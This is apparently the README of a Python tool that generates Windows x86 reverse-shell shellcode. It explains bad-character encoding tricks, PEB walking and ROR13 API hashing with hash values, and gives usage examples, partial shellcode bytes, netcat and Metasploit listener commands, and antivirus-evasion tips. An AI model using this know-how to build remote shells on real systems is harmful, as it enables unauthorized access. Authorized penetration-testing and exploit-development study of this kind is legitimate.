# clean_shellcode_gen
A sophisticated Python tool for generating x86 Windows reverse shell shellcode with automatic bad character avoidance. This generator creates position-independent shellcode that dynamically resolves Windows APIs without hardcoded addresses, making it suitable for exploit development and penetration testing.

## Overview

This tool generates fully functional reverse shell shellcode for Windows x86 systems. The shellcode is designed to be:
- **Position Independent**: No hardcoded addresses
- **Bad Character Aware**: Automatically avoids specified bad characters
- **Dynamic API Resolution**: Uses PEB walking and hash-based API resolution
- **Self-Contained**: No external dependencies in the generated shellcode

## Key Features

### 1. Intelligent Bad Character Avoidance

The generator implements multiple techniques to avoid bad characters:

#### Offset Splitting
When a direct offset contains bad characters, the assembler splits it into two operations:
```python
# Instead of: mov esi, [esi+0x20] (if 0x20 is bad)
# It generates: lea esi, [esi+0x10]  ; mov esi, [esi+0x10]
```

#### XOR Encoding
For 32-bit immediate values that contain bad characters:
```python
# Instead of: push 0x12345678 (if contains bad chars)
# It generates: push 0xencoded_value
#               pop eax
#               xor eax, 0xkey
#               push eax
```

#### Increment/Decrement Encoding
For 8-bit and 16-bit values:
```python
# Instead of: mov al, 0x41 (if 0x41 is bad)
# It generates: mov al, 0x40  ; inc al
# Or:          mov al, 0x42  ; dec al
```

#### Addition/Subtraction Encoding
For values that can't be directly encoded:
```python
# Instead of: mov eax, 0xbadvalue
# It generates: xor eax, eax  ; add eax, 0xbadvalue
```

#### ROR Decomposition
For rotate operations with bad immediate values:
```python
# Instead of: ror edx, 0x0d (if 0x0d is bad)
# It generates: ror edx, 0x08  ; ror edx, 0x05
# Or multiple single-byte rotates
```

### 2. Dynamic API Resolution

The shellcode uses advanced techniques to find and call Windows APIs:

#### PEB Walking
1. Accesses the Process Environment Block (PEB) via `FS:[0x30]`
2. Traverses the PEB_LDR_DATA structure
3. Locates kernel32.dll in the loaded modules list
4. Extracts the base address of kernel32.dll

#### Hash-Based API Resolution
- Uses ROR13 hash algorithm to identify APIs by name
- Avoids storing API names in plaintext
- Resolves APIs from the Export Address Table (EAT)
- Supports resolving APIs from any loaded DLL

#### Resolved APIs
The shellcode resolves the following Windows APIs:
- `LoadLibraryA` - Load additional DLLs (ws2_32.dll)
- `WSAStartup` - Initialize Winsock
- `WSASocketA` - Create a socket
- `WSAConnect` - Connect to remote host
- `CreateProcessA` - Create a process (cmd.exe)
- `WaitForSingleObject` - Wait for process completion

### 3. Reverse Shell Implementation

The generated shellcode performs the following operations:

1. **Stack Setup**: Allocates stack space and sets up frame pointer
2. **API Resolution**: Finds kernel32.dll and resolves required APIs
3. **Network Initialization**: Loads ws2_32.dll and initializes Winsock
4. **Socket Creation**: Creates a TCP socket
5. **Connection**: Connects to the specified IP address and port
6. **Process Creation**: Spawns cmd.exe with redirected I/O
7. **Cleanup**: Waits for the process to complete

## Architecture

### MiniAssembler Class

The `MiniAssembler` class provides a high-level interface for generating x86 assembly instructions while automatically avoiding bad characters.

#### Key Methods

- **Register Operations**: `mov_ebp_esp()`, `xor_eax_eax()`, etc.
- **Memory Operations**: `mov_esi_esi_off()`, `mov_ebx_esi_off()`, etc.
- **Control Flow**: `jmp_rel8()`, `jne_rel8()`, `call_rel32()`, etc.
- **Stack Operations**: `push_imm32()`, `pop_eax()`, `pushal()`, etc.
- **Arithmetic**: `add_eax_imm32()`, `sub_eax_ecx()`, `ror_edx_imm8()`, etc.

Each method automatically checks for bad characters and uses alternative encodings when necessary.

### ShellcodeGenerator Class

The `ShellcodeGenerator` class orchestrates the shellcode generation process.

#### Initialization
```python
gen = ShellcodeGenerator(ip="192.168.1.100", port=4444, bad_chars=[0x00, 0x0a, 0x0d])
```

#### Generation Process
1. Creates a `MiniAssembler` instance with bad character constraints
2. Generates the shellcode using the `generate()` method
3. Validates the output for bad characters
4. Returns the final shellcode bytes

## Usage

### Basic Usage

```bash
python gen_shellcode.py
```

The script will prompt for:
- **LHOST**: Target IP address (e.g., `192.168.1.100`)
- **LPORT**: Target port (e.g., `4444`)
- **Bad chars**: Optional list of bad characters (e.g., `\x00\x0a\x0d` or `0x00 0x0a 0x0d`)

### Example Session

```
 Reverse Shell Generator v2
[?] LHOST: 192.168.1.100
[?] LPORT: 4444
[?] Bad chars: \x00\x0a\x0d

[*] 192.168.1.100:4444
[*] Bad: ['0x0', '0xa', '0xd']

[+] Clean!
[+] Size: 512 bytes

shellcode = b"\x89\xe5\xb8\xf0\xf9\xff\xff\x01\xc4..."

[?] Run? (y/n): n
```

### Programmatic Usage

```python
from gen_shellcode import ShellcodeGenerator

# Define bad characters
bad_chars = [0x00, 0x0a, 0x0d, 0x20]

# Create generator
gen = ShellcodeGenerator("192.168.1.100", 4444, bad_chars)

# Generate shellcode
shellcode = gen.generate()

# Check for bad characters
found = gen.check_bad()
if found:
    print(f"Warning: Bad characters found at offsets: {found}")
else:
    print("Shellcode is clean!")

# Use the shellcode
print(f"Size: {len(shellcode)} bytes")
```

## Bad Character Handling

### Supported Formats

The `parse_bad()` function accepts multiple input formats:

- **Hex escape sequences**: `\x00\x0a\x0d`
- **Hex prefixes**: `0x00 0x0a 0x0d`
- **Mixed formats**: `\x00 0x0a \x0d`
- **Comma or space separated**: `\x00, \x0a, \x0d`

### Common Bad Characters

| Character | Hex | Description |
|-----------|-----|-------------|
| Null | `0x00` | String terminator |
| Newline | `0x0a` | Line feed |
| Carriage Return | `0x0d` | Carriage return |
| Space | `0x20` | Space character |

### Encoding Strategies

The assembler uses a priority-based approach:

1. **Direct encoding**: Try the simplest form first
2. **Offset splitting**: Split problematic offsets
3. **XOR encoding**: Use XOR with safe keys (0x01010101, 0x02020202, etc.)
4. **Increment/decrement**: Adjust nearby safe values
5. **Arithmetic decomposition**: Break complex operations into simpler ones

## Technical Details

### Shellcode Structure

1. **Prologue** (Stack setup)
   - Save frame pointer
   - Allocate stack space
   - Initialize registers

2. **PEB Walking** (Find kernel32.dll)
   - Access PEB via FS segment
   - Traverse module list
   - Extract kernel32.dll base

3. **PE Parsing** (Find exports)
   - Parse PE headers
   - Locate Export Address Table
   - Calculate function addresses

4. **Hash Resolution** (Find APIs)
   - Calculate ROR13 hashes
   - Search export table
   - Resolve function addresses

5. **Network Setup** (Winsock)
   - Load ws2_32.dll
   - Initialize Winsock
   - Create socket

6. **Connection** (Reverse shell)
   - Build sockaddr structure
   - Connect to target
   - Redirect I/O

7. **Process Creation** (cmd.exe)
   - Build STARTUPINFO
   - Create process
   - Wait for completion

### Hash Algorithm

The shellcode uses ROR13 (Rotate Right 13) hashing:

```python
def ror13_hash(name):
    hash = 0
    for char in name:
        hash = ror(hash, 13)
        hash += ord(char)
    return hash
```

This allows API resolution without storing API names in the shellcode.

### API Hashes Used

- `LoadLibraryA`: 0xec0e4e8e
- `WSAStartup`: 0x78b5b983
- `WSASocketA`: 0xadf509d9
- `WSAConnect`: 0xb32dba0c
- `CreateProcessA`: 0x16b3fe72
- `WaitForSingleObject`: 0x3bfcedcb

## Testing

### Local Testing

The script includes a `run()` function that:
1. Allocates executable memory using `VirtualAlloc`
2. Copies shellcode to the allocated memory
3. Creates a thread to execute the shellcode
4. Waits for completion

**Warning**: This will attempt to connect to the specified IP and port. Ensure you have a listener running.

### Setting Up a Listener

Before testing, set up a listener on the target machine:

```bash
# Using netcat
nc -lvp 4444

# Using ncat
ncat -lvp 4444

# Using Metasploit
use exploit/multi/handler
set payload windows/shell_reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
exploit
```

## Limitations

1. **Architecture**: Currently supports x86 (32-bit) only
2. **Platform**: Windows-specific (uses Windows APIs)
3. **Size**: Shellcode size varies based on bad character constraints
4. **Detection**: May be detected by antivirus software

## Advanced Features

### Custom Bad Character Sets

You can specify complex bad character sets:

```python
# Common web application bad chars
bad_chars = [0x00, 0x0a, 0x0d, 0x20, 0x22, 0x27, 0x3c, 0x3e, 0x5c]

# Protocol-specific bad chars
bad_chars = [0x00, 0x0a, 0x0d]  # HTTP
bad_chars = [0x00, 0x0a]        # Some protocols
```

### Size Optimization

The generator automatically optimizes for size when possible:
- Uses shorter instruction forms
- Combines operations when safe
- Minimizes register usage

### Error Handling

The generator will raise `ValueError` if it cannot encode a required operation while avoiding bad characters. This typically happens with very restrictive bad character sets.

## Comparison with Other Generators

### Advantages

1. **Automatic Bad Character Avoidance**: No manual encoding required
2. **Multiple Encoding Techniques**: Uses various strategies for maximum compatibility
3. **Dynamic API Resolution**: No hardcoded addresses
4. **Position Independent**: Works at any memory location
5. **Comprehensive**: Handles complex scenarios automatically

### Differences from MSFvenom

- **Bad Character Handling**: More sophisticated automatic avoidance
- **API Resolution**: Uses hash-based resolution instead of hardcoded addresses
- **Flexibility**: Easier to customize and extend
- **Transparency**: Python source code is readable and modifiable

## Security Considerations

### Ethical Use

This tool is intended for:
- Authorized penetration testing
- Security research
- Educational purposes
- CTF competitions

**Do not use this tool for unauthorized access to systems.**

### Detection

The generated shellcode may be detected by:
- Antivirus software
- Intrusion Detection Systems (IDS)
- Endpoint Detection and Response (EDR) solutions

Consider this when using in production environments.

### Obfuscation

For additional evasion, consider:
- Encrypting the shellcode
- Using staged payloads
- Implementing additional obfuscation techniques
- Using custom encoding schemes

## Troubleshooting

### Bad Characters Still Present

If bad characters are found in the output:
1. Verify the bad character list is correct
2. Check if the generator reported any encoding failures
3. Some operations may be impossible to encode with certain bad character sets

### Connection Fails

If the reverse shell doesn't connect:
1. Verify the IP address and port are correct
2. Ensure a listener is running on the target
3. Check firewall rules
4. Verify network connectivity

### Shellcode Doesn't Execute

If the shellcode crashes:
1. Ensure it's placed in executable memory
2. Verify the target is x86 Windows
3. Check for DEP (Data Execution Prevention) restrictions
4. Use a debugger to identify the failure point

## Code Structure

```
gen_shellcode.py
├── MiniAssembler
│   ├── __init__()              # Initialize with bad chars
│   ├── has_bad()               # Check for bad characters
│   ├── emit()                  # Emit bytes to code buffer
│   ├── mov_*()                 # Move operations
│   ├── add_*()                 # Addition operations
│   ├── xor_*()                 # XOR operations
│   ├── push_*()                # Push operations
│   ├── pop_*()                 # Pop operations
│   └── ...                     # Other x86 instructions
│
├── ShellcodeGenerator
│   ├── __init__()              # Initialize with IP, port, bad chars
│   ├── ip_to_int()             # Convert IP to integer
│   ├── generate()              # Main generation function
│   └── check_bad()             # Validate output
│
├── parse_bad()                 # Parse bad character input
├── run()                       # Test shellcode locally
└── main()                      # CLI interface
```

## Extending the Generator

### Adding New Instructions

To add support for new x86 instructions:

```python
def mov_edx_imm32(self, val):
    packed = struct.pack('<I', val)
    if not self.has_bad(b"\xba" + packed):
        self.emit(b"\xba" + packed)
    else:
        # Implement alternative encoding
        self.xor_edx_edx()
        self.add_edx_imm32(val)
```

### Custom Payloads

To create custom payload types:

```python
class CustomGenerator(ShellcodeGenerator):
    def generate(self):
        # Custom shellcode generation
        a = self.asm
        # ... your code ...
        return a.code
```

## References

- [PEB Structure](https://docs.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb)
- [PE File Format](https://docs.microsoft.com/en-us/windows/win32/debug/pe-format)
- [x86 Instruction Set](https://www.intel.com/content/www/us/en/developer/articles/technical/intel-sdm.html)
- [Windows API Documentation](https://docs.microsoft.com/en-us/windows/win32/api/)


## Disclaimer

This tool is for authorized security testing and educational purposes only. Unauthorized use of this tool against systems you do not own or have explicit permission to test is illegal and unethical. The authors and contributors are not responsible for any misuse of this tool.

---
